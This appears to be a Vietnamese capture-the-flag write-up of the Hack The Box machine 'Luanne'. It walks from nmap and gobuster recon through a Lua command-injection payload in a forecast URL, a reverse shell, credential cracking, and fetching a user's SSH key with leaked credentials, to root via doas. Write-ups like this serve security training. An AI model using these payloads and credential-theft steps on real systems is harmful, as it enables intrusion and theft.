![image](https://hackmd.io/_uploads/BJ8sphFs0.png)

# Machine info and Comment
## Machine info
[Link](https://app.hackthebox.com/machines/302/information)

## Comment
Máy này không thuộc dạng dễ, yêu cầu research nhiều về Lua, hdh NetBSD để khai thác

# Recon
## nmap 
Sau khi nmap ta scan được **3** port ssh, http và medusa web server
```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -n -sS 10.10.10.218       
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 09:44 EDT
Nmap scan report for 10.10.10.218
Host is up (0.23s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9001/tcp open  tor-orport

Nmap done: 1 IP address (1 host up) scanned in 43.13 seconds
```
```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -p22,80,9001 -sCV 10.10.10.218
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 09:45 EDT
Nmap scan report for 10.10.10.218
Host is up (0.23s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey: 
|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
80/tcp   open  http    nginx 1.19.0
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
| http-robots.txt: 1 disallowed entry 
|_/weather
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
|_http-server-header: Medusa/1.12
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
|_http-title: Error response
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 188.48 seconds
```
## Port 80 - http 
Truy cập vào trang ta sẽ được dẫn đến form login 

![image](https://hackmd.io/_uploads/H1ViY-csC.png)

![image](https://hackmd.io/_uploads/S1v2YW9s0.png)

Xem nội dung của `robots.txt` có path `/weather` nhưng cũng tương tự không khai thác được gì
### Gobuster
Vì có sẵn **gobuster** nên để nó chạy trên `weather`. Nó đưa cho chúng ta một path khác có tên là `forecast`. Truy cập vào ta có nội dung hiển thị:
```
┌──(kali㉿kali)-[~/Downloads]
└─$ gobuster dir -u 10.10.10.218/weather -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.218/weather
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/forecast             (Status: 200) [Size: 90]
```

![image](https://hackmd.io/_uploads/HJBFcW5iA.png)

![image](https://hackmd.io/_uploads/SJdcc-9s0.png)

![image](https://hackmd.io/_uploads/SJQn5Wqs0.png)

## Port 9001 - Medusa server
Vì chưa có credential nên tạm bỏ qua port này

![image](https://hackmd.io/_uploads/SJ2jQmqiA.png)

# User flag
## Exploit 
### OS command
Sau khi thử với các tham số, ta thêm `'` ở cuối tham số để xem nó trả về lỗi không. Nó báo lỗi của Lua và đường dẫn thư mục cùng với thông báo lỗi.

![image](https://hackmd.io/_uploads/HyU7ib5jR.png)

Lua là ngôn ngữ lập trình và khi tìm google về cách khai thác này thì nó có thể dính vào lỗ hổng CMDi. Ta thêm `')os.execute("whoami")--` vào cuối URL. Lệnh được thực thi

![image](https://hackmd.io/_uploads/B1skZfqiR.png)

Tạo 1 reverse shell và ecode thì nó mới chạy thành công 

![image](https://hackmd.io/_uploads/r1eRZM5iR.png)

Và ta vẫn chưa thể vào để lấy được user flag

![image](https://hackmd.io/_uploads/r1N9Gf5jR.png)

### Linpeas
Upload `linpeas` vào máy mục tiêu và ta quét được credential của user `webapi_user` và port 9001

![image](https://hackmd.io/_uploads/rkRb8z5s0.png)

### John The Ripper
Crack pass thu thập được bằng john 

![image](https://hackmd.io/_uploads/Syko8zqiA.png)

### Read file by curl
Ta liệt kê các port đang chạy. Ta có thể thấy ngoài ra còn có 1 port **3001** đang được nghe

![image](https://hackmd.io/_uploads/S1hdKM9j0.png)

Xem các quy trình sử dụng các cổng này
```
ps -auxww | grep 3001

-w hiển thị toàn bộ output mà không bị cắt ngắn
```
![image](https://hackmd.io/_uploads/HJZjcM9sC.png)

```
curl -u 'webapi_user':'iamthebest' http://127.0.0.1:3001/~r.michaels/
```
![image](https://hackmd.io/_uploads/BkJ1hG5oC.png)

Tương tự để lấy được `id_rsa`
```
curl -u 'webapi_user':'iamthebest' http://127.0.0.1:3001/~r.michaels/id_rsa
```
## Post-Exploit
![image](https://hackmd.io/_uploads/HJG7pf5iA.png)
```
luanne$ cat /home/r.michaels/user.txt
ea5f0ce6a917b0be1*******
```
# Root flag
## Exploit
Sau khi liệt kê 3 thư mục hiện có thì có thư mục `backups` là có thể khai thác nhất

![image](https://hackmd.io/_uploads/SkTPAzciA.png)

Nó là một thư mục đã bị mã hóa và ta sẽ sử dụng [netpgp](https://man.netbsd.org/netpgp.1) để mã hóa nó
```
luanne$ ls
devel_backup-2020-09-16.tar.gz.enc
```
### netpgp
Vì không thể dcode thư mục vì từ chối quyền nên ta sẽ chuyển thư mục vào file `/tmp`
```
netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=backups.tar.gz
```
![image](https://hackmd.io/_uploads/H14zx75oA.png)

![image](https://hackmd.io/_uploads/BkPtxXcs0.png)

cat file `./httpasswd` để lấy được credential 

![image](https://hackmd.io/_uploads/By9WzQ9jR.png)

## Post-Exploit
Tuy nhiên khi switch user 

![image](https://hackmd.io/_uploads/r1xeVm9iA.png)

Các lệnh như sudo su không hoạt động vì đây là hệ điều hành openbsd
```
uname -a
```
![image](https://hackmd.io/_uploads/BJoNEQ5iC.png)

Ta phải [switch user](https://man.freebsd.org/cgi/man.cgi?query=doas&sektion=1&manpath=freebsd-release-ports) bằng `doas`. Lệnh `doas` trong NetBSD giống như lệnh `sudo` trong hệ điều hành Linux.

```
luanne$ doas su
Password:
sh: Cannot determine current working directory
# id
uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)
```
## Post-Exploit 
```
# cat /root/root.txt
7a9b5c206e8e8ba******
```

![image](https://hackmd.io/_uploads/HJ_jSm5jC.png)
